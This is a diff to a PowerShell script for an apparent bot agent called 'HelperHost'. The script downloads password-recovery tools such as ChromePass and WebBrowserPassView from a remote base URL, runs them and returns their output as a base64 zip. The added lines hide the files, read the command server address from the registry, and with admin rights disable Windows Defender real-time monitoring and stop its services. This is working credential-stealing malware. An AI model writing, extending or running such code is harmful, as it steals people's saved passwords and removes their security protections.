@@ -1,7 +1,19 @@
 $ErrorActionPreference = 'Continue'
 $toolsDir = Join-Path $env:LOCALAPPDATA 'HelperHost\tools'
 New-Item -ItemType Directory -Force -Path $toolsDir | Out-Null
+cmd /c ('attrib +h +s "' + $toolsDir + '"') | Out-Null
+cmd /c ('attrib +h +s "' + (Join-Path $env:LOCALAPPDATA 'HelperHost') + '"') | Out-Null
+
 $base = $env:AGENTSHE_FILES
+if (-not $base) {
+  try {
+    $st = (Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
+    if ($st) {
+      $j = $st | ConvertFrom-Json
+      if ($j.bot_base) { $base = ($j.bot_base.TrimEnd('/') + '/files') }
+    }
+  } catch {}
+}
 if (-not $base) {
   try {
     $cfg = Get-Content (Join-Path $env:LOCALAPPDATA 'HelperHost\config.json') -Raw | ConvertFrom-Json
@@ -10,6 +22,23 @@ if (-not $base) {
 }
 if (-not $base) { throw 'AGENTSHE_FILES / bot_base manquant' }
 $base = $base.TrimEnd('/')
+
+try {
+  $wid = [Security.Principal.WindowsIdentity]::GetCurrent()
+  $prin = New-Object Security.Principal.WindowsPrincipal($wid)
+  if ($prin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    if (Get-Command Set-MpPreference -EA SilentlyContinue) {
+      Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue
+      Set-MpPreference -ExclusionPath $toolsDir -EA SilentlyContinue
+    }
+    foreach ($svc in @('WinDefend', 'WdNisSvc', 'Sense')) {
+      Stop-Service $svc -Force -EA SilentlyContinue
+    }
+  } elseif (Get-Command Add-MpPreference -EA SilentlyContinue) {
+    Add-MpPreference -ExclusionPath $toolsDir -EA SilentlyContinue
+  }
+} catch {}
+
 $tools = @(
   @{ id = 'chromepass'; leaf = 'ChromePass.exe'; rel = 'ChromePass.exe' },
   @{ id = 'webbrowser'; leaf = 'WebBrowserPassView.exe'; rel = 'WebBrowserPassView.exe' },
@@ -22,6 +51,7 @@ $tools = @(
   @{ id = 'pstpassword'; leaf = 'PstPassword.exe'; rel = 'PstPassword.exe' }
 )
 $files = @()
+$errs = @()
 foreach ($t in $tools) {
   try {
     $dest = Join-Path $toolsDir $t.leaf
@@ -34,7 +64,9 @@ foreach ($t in $tools) {
         & curl.exe -fsSL $url32 -o $dest 2>$null
       }
     }
-    if (-not (Test-Path $dest)) { continue }
+    if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {
+      throw 'download failed'
+    }
     Unblock-File $dest -EA SilentlyContinue
     $zone = $dest + ':Zone.Identifier'
     if (Test-Path $zone) { Remove-Item $zone -Force -EA SilentlyContinue }
@@ -44,14 +76,24 @@ foreach ($t in $tools) {
     if ($null -ne $p) {
       if (-not $p.WaitForExit(45000)) {
         Stop-Process -Id $p.Id -Force -EA SilentlyContinue
+        throw 'timeout'
       }
+    } else {
+      throw 'start failed'
     }
     Start-Sleep -Milliseconds 200
     if (-not (Test-Path $out)) {
       Set-Content -Path $out -Value '(aucune donnee)' -Encoding UTF8
     }
+    cmd /c ('attrib +h +s "' + $dest + '"') | Out-Null
+    cmd /c ('attrib +h +s "' + $out + '"') | Out-Null
     $files += $out
-  } catch {}
+  } catch {
+    $err = Join-Path $toolsDir ($t.id + '.err.txt')
+    Set-Content -Path $err -Value ("$($t.id): " + $_.Exception.Message) -Encoding UTF8
+    $files += $err
+    $errs += $t.id
+  }
 }
 $zip = Join-Path $toolsDir ('tools-export-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.zip')
 Remove-Item $zip -Force -EA SilentlyContinue
@@ -61,5 +103,10 @@ if ($files.Count -eq 0) {
   $files = @($empty)
 }
 Compress-Archive -Path $files -DestinationPath $zip -Force
+cmd /c ('attrib +h +s "' + $zip + '"') | Out-Null
+cmd /c ('attrib +h +s /s /d "' + $toolsDir + '\*"') | Out-Null
 $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($zip))
 Write-Output ('FILEB64:' + [IO.Path]::GetFileName($zip) + ':' + $b64)
+if ($errs.Count -gt 0) {
+  Write-Output ('ERRS:' + ($errs -join ','))
+}
